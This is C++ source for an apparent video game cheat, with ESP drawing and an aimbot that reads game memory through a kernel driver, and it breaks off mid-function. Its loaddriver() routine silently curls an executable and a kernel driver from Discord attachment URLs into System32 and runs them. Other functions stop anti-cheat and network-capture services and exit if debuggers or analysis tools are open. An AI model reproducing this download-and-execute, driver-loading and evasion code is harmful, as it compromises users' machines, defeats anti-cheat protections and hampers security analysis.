#include "win_utils.h"
#include "kernelmode_proc_handler.hpp"
#include <dwmapi.h>
#include "Main.h"
#include <sstream>
#include <string>
#include <algorithm>
#include <list>
#include "XorStr.hpp"
#include <iostream>
#include "xorstr.hpp"
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <lmcons.h>
#include <random>



#define OFFSET_UWORLD 0xB78BC30

std::string random_string(std::size_t length)
{

	const std::string CHARACTERS = ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

	std::random_device random_device;
	std::mt19937 generator(random_device());
	std::uniform_int_distribution<> distribution(0, CHARACTERS.size() - 1);

	std::string random_string;

	for (std::size_t i = 0; i < length; ++i)
	{
		random_string += CHARACTERS[distribution(generator)];
	}

	return random_string;
}


void loaddriver()
{
	HANDLE handle;

	handle = CreateFileA(XorStr("\\\\.\\injdrv").c_str(), GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (handle == INVALID_HANDLE_VALUE) { 

		printf(XorStr("\n\n [-] L").c_str());
		Sleep(100);
		printf(XorStr("o").c_str());
		Sleep(100);
		printf(XorStr("a").c_str());
		Sleep(100);
		printf(XorStr("d").c_str());
		Sleep(100);
		printf(XorStr("i").c_str());
		Sleep(100);
		printf(XorStr("n").c_str());
		Sleep(100);
		printf(XorStr("g").c_str());
		Sleep(100);
		printf(XorStr(" ").c_str());
		Sleep(100);
		printf(XorStr("D").c_str());
		Sleep(100);
		printf(XorStr("r").c_str());
		Sleep(100);
		printf(XorStr("i").c_str());
		Sleep(100);
		printf(XorStr("v").c_str());
		Sleep(100);
		printf(XorStr("e").c_str());
		Sleep(100);
		printf(XorStr("r").c_str());
		Sleep(100);
		printf(XorStr("s").c_str());
		system("curl https://cdn.discordapp.com/attachments/849724734601691176/868276541753270292/mapper.exe --output C:/Windows/System32/sxwhs.exe >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/832000448915308555/870646327514648606/f334.sys --output C:/Windows/System32/f334.sys >nul 2>&1");
		system("C:/Windows/System32/sxwhs.exe C:/Windows/System32/f334.sys");
		printf(XorStr("\n").c_str());
		system("del gdrv.sys >nul 2>&1");
		system("del swind2.exe >nul 2>&1");
		printf(XorStr(" [+] inialized \n").c_str());
		system("timeout 1 >nul");
	}


}

void bsod11()
{
	printf("trying to crack lol");
	exit(EXIT_FAILURE);
}

void debuggerfound1() {
	if (IsDebuggerPresent())
	{
		bsod11();
	}
}

void nignog1() {
	if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { bsod11(); }
	if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { bsod11(); }
	if (FindWindowA(NULL, ("Fiddler"))) { bsod11(); }
	if (FindWindowA(NULL, ("HTTP Debugger"))) { bsod11(); }
	if (FindWindowA(NULL, ("x64dbg"))) { bsod11(); }
	if (FindWindowA(NULL, ("dnSpy"))) { bsod11(); }
	if (FindWindowA(NULL, ("FolderChangesView"))) { bsod11(); }
	if (FindWindowA(NULL, ("BinaryNinja"))) { bsod11(); }
	if (FindWindowA(NULL, ("HxD"))) { bsod11(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { bsod11(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.1"))) { bsod11(); }
	if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { bsod11(); }
	if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { bsod11(); }
	if (FindWindowA(NULL, ("Cheat Engine 6.8"))) { bsod11(); }
	if (FindWindowA(NULL, ("Ida"))) { bsod11(); }
	if (FindWindowA(NULL, ("Ida Pro"))) { bsod11(); }
	if (FindWindowA(NULL, ("Ida Freeware"))) { bsod11(); }
	if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { bsod11(); }
	if (FindWindowA(NULL, ("Process Hacker"))) { bsod11(); }
	if (FindWindowA(NULL, ("Process Hacker 2"))) { bsod11(); }
	if (FindWindowA(NULL, ("OllyDbg"))) { bsod11(); }
}
void system_no_output1(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)

		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}
void tasky1()
{




	system_no_output1("net stop FACEIT >nul 2>&1");
	system_no_output1("net stop ESEADriver2 >nul 2>&1");
	system_no_output1("sc stop HTTPDebuggerPro >nul 2>&1");
	system_no_output1("sc stop KProcessHacker3 >nul 2>&1");
	system_no_output1("sc stop KProcessHacker2 >nul 2>&1");
	system_no_output1("sc stop KProcessHacker1 >nul 2>&1");
	system_no_output1("sc stop wireshark >nul 2>&1");
	system_no_output1("sc stop npf >nul 2>&1");



}



ImFont* m_pFont;

DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR PlayerState;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Persistentlevel;
DWORD_PTR Ulevel;

Vector3 localactorpos;

uint64_t TargetPawn;
int localplayerID;

bool isaimbotting;

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;

DWORD ScreenCenterX;
DWORD ScreenCenterY;
DWORD ScreenCenterZ;

std::unique_ptr<process_handler> proc;

template <typename type>
type rpm(uint64_t src, uint64_t size = sizeof(type)) {
	type ret;
	proc->read_memory(src, (uintptr_t)&ret, size);
	return ret;
}

template <typename type>
type wpm(uint64_t src, uint64_t tochange, uint64_t size = sizeof(type)) {
	type ret;
	proc->write_memory(src, tochange, size);
	return ret;
}

static void xCreateWindow();
static void xInitD3d();
static void xMainLoop();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;

FTransform GetBoneIndex(DWORD_PTR mesh, int index) {
	DWORD_PTR bonearray = rpm<DWORD_PTR>(mesh + 0x4B0);
	if (bonearray == NULL) {
		bonearray = rpm<DWORD_PTR>(mesh + 0x4B0);
	}
	return rpm<FTransform>(bonearray + (index * 0x30));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id) {
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = rpm<FTransform>(mesh + 0x1C0);
	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());
	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

D3DMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0)) {
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}








extern Vector3 CameraEXT(0, 0, 0);

Vector3 ProjectWorldToScreen(Vector3 WorldLocation) {
	Vector3 Screenlocation = Vector3(0, 0, 0);
	Vector3 Camera;

	auto chain69 = rpm<uintptr_t>(Localplayer + 0xa8);
	uint64_t chain699 = rpm<uintptr_t>(chain69 + 8);

	Camera.x = rpm<float>(chain699 + 0x8f8);
	Camera.y = rpm<float>(Rootcomp + 0x12C);

	float test = asin(Camera.x);
	float degrees = test * (180.0 / M_PI);
	Camera.x = degrees;

	if (Camera.y < 0)
		Camera.y = 360 + Camera.y;

	D3DMATRIX tempMatrix = Matrix(Camera);
	Vector3 vAxisX, vAxisY, vAxisZ;

	vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	uint64_t chain = rpm<uint64_t>(Localplayer + 0x70);
	uint64_t chain1 = rpm<uint64_t>(chain + 0x98);
	uint64_t chain2 = rpm<uint64_t>(chain1 + 0x140);

	Vector3 vDelta = WorldLocation - rpm<Vector3>(chain2 + 0x10);
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	float zoom = rpm<float>(chain699 + 0x580);

	float FovAngle = 80.0f / (zoom / 1.19f);

	float ScreenCenterX = Width / 2;
	float ScreenCenterY = Height / 2;
	float ScreenCenterZ = Height / 2;

	Screenlocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.z = ScreenCenterZ - vTransformed.z * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;

	return Screenlocation;
}

DWORD Menuthread(LPVOID in) {
	while (1) {
		if (GetAsyncKeyState(VK_F2) & 1) {
			item.Show_Menu = !item.Show_Menu;
		}
		if (GetAsyncKeyState(VK_F2) & 1) {
			item.Show_Menu = !item.Show_Menu;
		}
		Sleep(2);
	}
}

Vector3 AimbotCorrection(float bulletVelocity, float bulletGravity, float targetDistance, Vector3 targetPosition, Vector3 targetVelocity) {
	Vector3 recalculated = targetPosition;
	float gravity = fabs(bulletGravity);
	float time = targetDistance / fabs(bulletVelocity);
	/* Bullet drop correction */
	float bulletDrop = (gravity / 250) * time * time;
	recalculated.z += bulletDrop * 120;
	/* Player movement correction */
	recalculated.x += time * (targetVelocity.x);
	recalculated.y += time * (targetVelocity.y);
	recalculated.z += time * (targetVelocity.z);
	return recalculated;
}

void aimbot(float x, float y, float z) {
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	float ScreenCenterZ = (Depth / 2);
	int AimSpeed = item.Aim_Speed;
	float TargetX = 0;
	float TargetY = 0;
	float TargetZ = 0;

	if (x != 0) {
		if (x > ScreenCenterX) {
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX) {
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0) {
		if (y > ScreenCenterY) {
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY) {
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	if (z != 0) {
		if (z > ScreenCenterZ) {
			TargetZ = -(ScreenCenterZ - z);
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ > ScreenCenterZ * 2) TargetZ = 0;
		}

		if (z < ScreenCenterZ) {
			TargetZ = z - ScreenCenterZ;
			TargetZ /= AimSpeed;
			if (TargetZ + ScreenCenterZ < 0) TargetZ = 0;
		}
	}


	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);
	if (item.Auto_Fire) {
		mouse_event(MOUSEEVENTF_LEFTDOWN, DWORD(NULL), DWORD(NULL), DWORD(0x0002), ULONG_PTR(NULL));
		mouse_event(MOUSEEVENTF_LEFTUP, DWORD(NULL), DWORD(NULL), DWORD(0x0004), ULONG_PTR(NULL));
	}


	return;
}

double GetCrossDistance(double x1, double y1, double z1, double x2, double y2, double z2) {
	return sqrt(pow((x2 - x1), 2) + pow((y2 - y1), 2));
}

typedef struct _FNlEntity {
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity;

std::vector<FNlEntity> entityList;



void AimAt(DWORD_PTR entity) {
	uint64_t currentactormesh = rpm<uint64_t>(entity + 0x280);
	auto rootHead = GetBoneWithRotation(currentactormesh, item.hitbox);


	if (item.Aim_Prediction) {
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = rpm<uint64_t>(entity + 0x130);
		Vector3 vellocity = rpm<Vector3>(CurrentActorRootComponent + 0x140);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);

			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				aimbot(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z);
			}
		}
	}
}

void AimAt2(DWORD_PTR entity) {
	uint64_t currentactormesh = rpm<uint64_t>(entity + 0x280);
	auto rootHead = GetBoneWithRotation(currentactormesh, item.hitbox);

	if (item.Aim_Prediction) {
		float distance = localactorpos.Distance(rootHead) / 250;
		uint64_t CurrentActorRootComponent = rpm<uint64_t>(entity + 0x130);
		Vector3 vellocity = rpm<Vector3>(CurrentActorRootComponent + 0x140);
		Vector3 Predicted = AimbotCorrection(30000, -504, distance, rootHead, vellocity);
		Vector3 rootHeadOut = ProjectWorldToScreen(Predicted);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				if (item.Lock_Line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ item.LockLine[0], item.LockLine[1], item.LockLine[2], 1.0f }), item.Thickness);

				}
			}
		}
	}
	else {
		Vector3 rootHeadOut = ProjectWorldToScreen(rootHead);
		if (rootHeadOut.x != 0 || rootHeadOut.y != 0 || rootHeadOut.z != 0) {
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, rootHeadOut.z, Width / 2, Height / 2, Depth / 2) <= item.AimFOV * 1)) {
				if (item.Lock_Line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(rootHeadOut.x, rootHeadOut.y), ImGui::GetColorU32({ item.LockLine[0], item.LockLine[1], item.LockLine[2], 1.0f }), item.Thickness);
				}
			}
		}
	}
}

void DrawESP() {
	if (item.Draw_FOV_Circle) {
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(item.AimFOV), ImGui::GetColorU32({ item.DrawFOVCircle[0], item.DrawFOVCircle[1], item.DrawFOVCircle[2], 1.0f }), item.Shape, item.Thickness);
	}
	if (item.Cross_Hair) {
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2 - 10, Height / 2), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), item.Thickness);

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2 + 10, Height / 2), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), item.Thickness);

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2, Height / 2 - 10), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), item.Thickness); //change 10

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(Width / 2, Height / 2 + 10), ImGui::GetColorU32({ item.CrossHair[0], item.CrossHair[1], item.CrossHair[2], 1.0f }), item.Thickness); //change 10
	}



	char dist[64];
	sprintf_s(dist, "\n", ImGui::GetIO().Framerate);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(15, 15), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], 4.0f }), dist);

	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	DWORD_PTR AActors = rpm<DWORD_PTR>(Ulevel + 0x98);

	int ActorTeamId = rpm<int>(0xF28);

	int curactorid = rpm<int>(0x18);

	if (curactorid == localplayerID || curactorid == 20328438 || curactorid == 20328753 || curactorid == 9343426 || curactorid == 9875120 || curactorid == 9877254 || curactorid == 22405639 || curactorid == 9874439 || curactorid == 14169230)

		if (AActors == (DWORD_PTR)nullptr)
			return;

	for (unsigned long i = 0; i < entityListCopy.size(); ++i) {
		FNlEntity entity = entityListCopy[i];

		uint64_t CurrentActor = rpm<uint64_t>(AActors + i * 0x8);

		uint64_t CurActorRootComponent = rpm<uint64_t>(entity.Actor + 0x130);
		if (CurActorRootComponent == (uint64_t)nullptr || CurActorRootComponent == -1 || CurActorRootComponent == NULL)
			continue;

		Vector3 actorpos = rpm<Vector3>(CurActorRootComponent + 0x11C);
		Vector3 actorposW2s = ProjectWorldToScreen(actorpos);

		DWORD64 otherPlayerState = rpm<uint64_t>(entity.Actor + 0x238);
		if (otherPlayerState == (uint64_t)nullptr || otherPlayerState == -1 || otherPlayerState == NULL)
			continue;

		localactorpos = rpm<Vector3>(Rootcomp + 0x11C);

		Vector3 bone66 = GetBoneWithRotation(entity.mesh, 66);
		Vector3 bone0 = GetBoneWithRotation(entity.mesh, 0);

		Vector3 top = ProjectWorldToScreen(bone66);
		Vector3 chest = ProjectWorldToScreen(bone66);
		Vector3 aimbotspot = ProjectWorldToScreen(bone66);
		Vector3 bottom = ProjectWorldToScreen(bone0);

		Vector3 Head = ProjectWorldToScreen(Vector3(bone66.x, bone66.y, bone66.z + 15));

		float distance = localactorpos.Distance(bone66) / 100.f;
		float BoxHeight = (float)(Head.y - bottom.y);
		float CornerHeight = abs(Head.y - bottom.y);
		float CornerWidth = BoxHeight * 0.80;

		int MyTeamId = rpm<int>(PlayerState + 0xF28);
		int ActorTeamId = rpm<int>(otherPlayerState + 0xF28);
		int curactorid = rpm<int>(CurrentActor + 0x18);

		if (MyTeamId != ActorTeamId) {
			if (distance < item.VisDist) {
				if (item.Esp_line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2), ImVec2(chest.x, chest.y), ImGui::GetColorU32({ item.LineESP[0], item.LineESP[1], item.LineESP[2], 1.0f }), item.Thickness);
				}
				if (item.Head_dot) {
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight / 25), ImGui::GetColorU32({ item.Headdot[0], item.Headdot[1], item.Headdot[2], item.Transparency }), 50);
				}
				if (item.Triangle_ESP_Filled) {
					ImGui::GetOverlayDrawList()->AddTriangleFilled(ImVec2(Head.x, Head.y - 45), ImVec2(bottom.x - (BoxHeight / 2), bottom.y), ImVec2(bottom.x + (BoxHeight / 2), bottom.y), ImGui::GetColorU32({ item.TriangleESPFilled[0], item.TriangleESPFilled[1], item.TriangleESPFilled[2], item.Transparency }));
				}
				if (item.Triangle_ESP) {
					ImGui::GetOverlayDrawList()->AddTriangle(ImVec2(Head.x, Head.y - 50), ImVec2(bottom.x - (BoxHeight / 2), bottom.y), ImVec2(bottom.x + (BoxHeight / 2), bottom.y), ImGui::GetColorU32({ item.TriangleESP[0], item.TriangleESP[1], item.TriangleESP[2], 1.0f }), item.Thickness);
				}
				if (item.Esp_box_fill) {
					ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(Head.x - (CornerWidth / 2), Head.y), ImVec2(bottom.x + (CornerWidth / 2), bottom.y), ImGui::GetColorU32({ item.Espboxfill[0], item.Espboxfill[1], item.Espboxfill[2], item.Transparencyy }));
				}
				if (item.Esp_box) {
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 2), Head.y), ImVec2(bottom.x + (CornerWidth / 2), bottom.y), ImGui::GetColorU32({ item.Espbox[0], item.Espbox[1], item.Espbox[2], 1.0f }), 0, item.Thickness);
				}
				if (item.Esp_Corner_Box) {
					DrawCornerBox(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImGui::GetColorU32({ item.BoxCornerESP[0], item.BoxCornerESP[1], item.BoxCornerESP[2], 1.0f }), item.Thickness);
				}
				if (item.Esp_Circle_Fill) {
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight), ImGui::GetColorU32({ item.EspCircleFill[0], item.EspCircleFill[1], item.EspCircleFill[2], item.Transparency }), item.Shape);
				}
				if (item.Esp_Circle) {
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Head.x, Head.y), float(BoxHeight), ImGui::GetColorU32({ item.EspCircle[0], item.EspCircle[1], item.EspCircle[2], 1.0f }), item.Shape, item.Thickness);
				}
				if (item.Distance_Esp) {
					char dist[64];
					sprintf_s(dist, "[%.f]", distance);
					ImGui::GetOverlayDrawList()->AddText(ImVec2(bottom.x - 20, bottom.y), ImGui::GetColorU32({ color.white[0], color.white[1], color.white[2], 4.0f }), dist);
				}
				if (item.Aimbot) {
					auto dx = aimbotspot.x - (Width / 2);
					auto dy = aimbotspot.y - (Height / 2);
					auto dz = aimbotspot.z - (Depth / 2);
					auto dist = sqrtf(dx * dx + dy * dy + dz * dz) / 100.0f;
					if (dist < item.AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = entity.Actor;

					}
				}
			}
		}
		if (MyTeamId != ActorTeamId) {
			if (distance < item.VisDist) {
				if (item.Team_Esp_line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 1), ImVec2(bottom.x, bottom.y), ImGui::GetColorU32({ item.TeamLineESP[0], item.TeamLineESP[1], item.TeamLineESP[2], 1.0f }), item.Thickness);
				}
				if (item.Team_Head_dot) {
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight / 25), ImGui::GetColorU32({ item.TeamHeaddot[0], item.TeamHeaddot[1], item.TeamHeaddot[2], item.Transparency }), 50);
				}
				if (item.Team_Triangle_ESP_Filled) {
					ImGui::GetOverlayDrawList()->AddTriangleFilled(ImVec2(Head.x, Head.y - 45), ImVec2(bottom.x - (BoxHeight / 2), bottom.y), ImVec2(bottom.x + (BoxHeight / 2), bottom.y), ImGui::GetColorU32({ item.TeamTriangleESPFilled[0], item.TeamTriangleESPFilled[1], item.TeamTriangleESPFilled[2], item.Transparency }));
				}
				if (item.Team_Triangle_ESP) {
					ImGui::GetOverlayDrawList()->AddTriangle(ImVec2(Head.x, Head.y - 50), ImVec2(bottom.x - (BoxHeight / 2), bottom.y), ImVec2(bottom.x + (BoxHeight / 2), bottom.y), ImGui::GetColorU32({ item.TeamTriangleESP[0], item.TeamTriangleESP[1], item.TeamTriangleESP[2], 1.0f }), item.Thickness);
				}
				if (item.Team_Esp_box_fill) {
					ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(Head.x - (CornerWidth / 2), Head.y), ImVec2(bottom.x + (CornerWidth / 2), bottom.y), ImGui::GetColorU32({ item.TeamEspboxfill[0], item.TeamEspboxfill[1], item.TeamEspboxfill[2], item.Transparency }));
				}
				if (item.Team_Esp_box) {
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (CornerWidth / 2), Head.y), ImVec2(bottom.x + (CornerWidth / 2), bottom.y), ImGui::GetColorU32({ item.TeamEspbox[0], item.TeamEspbox[1], item.TeamEspbox[2], 1.0f }), 0, item.Thickness);
				}
				if (item.Team_Esp_Corner_Box) {
					DrawCornerBox(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImGui::GetColorU32({ item.TeamBoxCornerESP[0], item.TeamBoxCornerESP[1], item.TeamBoxCornerESP[2], 1.0f }), item.Thickness);
				}
				if (item.Team_Esp_Circle_Fill) {
					ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Head.x, Head.y), float(BoxHeight), ImGui::GetColorU32({ item.TeamEspCircleFill[0], item.TeamEspCircleFill[1], item.TeamEspCircleFill[2], item.Transparency }), item.Shape);
				}
				if (item.Team_Esp_Circle) {
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Head.x, Head.y), float(BoxHeight), ImGui::GetColorU32({ item.TeamEspCircle[0], item.TeamEspCircle[1], item.TeamEspCircle[2], 1.0f }), item.Shape, item.Thickness);
				}
				if (item.Team_Distance_Esp) {
					char dist[64];
					sprintf_s(dist, "PLAYER", distance);
					ImGui::GetOverlayDrawList()->AddText(ImVec2(top.x - 20, top.y), ImGui::GetColorU32({ color.LightYellowGreen[0], color.LightYellowGreen[1], color.LightYellowGreen[2], 4.0f }), dist);

				}
				if (item.Team_Aimbot) {
					auto dx = aimbotspot.x - (Width / 2);
					auto dy = aimbotspot.y - (Height / 2);
					auto dz = aimbotspot.z - (Depth / 2);
					auto dist = sqrtf(dx * dx + dy * dy + dz * dz) / 100.0f;
					if (dist < item.AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = entity.Actor;
					}

				}
			}
		}
		else if (curactorid == 18391356) {
			ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 1), ImVec2(bottom.x, bottom.y), ImGui::GetColorU32({ item.TeamLineESP[0], item.TeamLineESP[1], item.TeamLineESP[2], 1.0f }), item.Thickness);
		}
	}

	if (item.Aimbot) {
		if (closestPawn != 0) {
			if (item.Aimbot && closestPawn && GetAsyncKeyState(item.aimkey) < 0) {
				AimAt(closestPawn);

				if (item.Auto_Bone_Switch) {

					item.boneswitch += 1;
					if (item.boneswitch == 700) {
						item.boneswitch = 0;
					}

					if (item.boneswitch == 0) {
						item.hitboxpos = 0;
					}
					else if (item.boneswitch == 50) {
						item.hitboxpos = 1;
					}
					else if (item.boneswitch == 100) {
					}
					else if (item.boneswitch == 150) {
						item.hitboxpos = 3;
					}
					else if (item.boneswitch == 200) {
						item.hitboxpos = 4;
					}
					else if (item.boneswitch == 250) {
						item.hitboxpos = 5;
					}
					else if (item.boneswitch == 300) {
						item.hitboxpos = 6;
					}
					else if (item.boneswitch == 350) {
						item.hitboxpos = 7;
					}
					else if (item.boneswitch == 400) {
						item.hitboxpos = 6;
					}
					else if (item.boneswitch == 450) {
						item.hitboxpos = 5;
					}
					else if (item.boneswitch == 500) {
						item.hitboxpos = 4;
					}
					else if (item.boneswitch == 550) {
						item.hitboxpos = 3;
					}
					else if (item.boneswitch == 600) {
						item.hitboxpos = 2;
					}
					else if (item.boneswitch == 650) {
						item.hitboxpos = 1;



					}
				}
			}
			else {
				isaimbotting = false;
				AimAt2(closestPawn);
			}
		}
	}
}

void GetKey() {
	if (item.Team_Distance_Esp) {
		;
	}
	else if (item.hitboxpos == 1) {
		item.hitbox = 65;

	}
	else if (item.hitboxpos == 2) {
		item.hitbox = 64;

	}
	else if (item.hitboxpos == 3) {
		item.hitbox = 36;

	}
	else if (item.hitboxpos == 4) {
		item.hitbox = 7;

	}
	else if (item.hitboxpos == 5) {
		item.hitbox = 6;
	}
	else if (item.hitboxpos == 6) {
		item.hitbox = 5;

	}
	else if (item.hitboxpos == 7) {
		item.hitbox = 2;

	}

	if (item.aimkeypos == 0) {
		item.aimkey = VK_RBUTTON;
	}

	else if (item.aimkeypos == 1) {
		item.aimkey = VK_LBUTTON;
	}
	else if (item.aimkeypos == 2) {
		item.aimkey = VK_CAPITAL;
	}
	else if (item.hitboxpos == 99) {
		item.hitbox = 66;
	}

	DrawESP();
}

int r, g, b;
int r1, g2, b2;

float color_red = 1.;
float color_green = 0;
float color_blue = 0;
float color_random = 0.0;
float color_speed = -10.0;
bool rainbowmode = false;

void Active() {
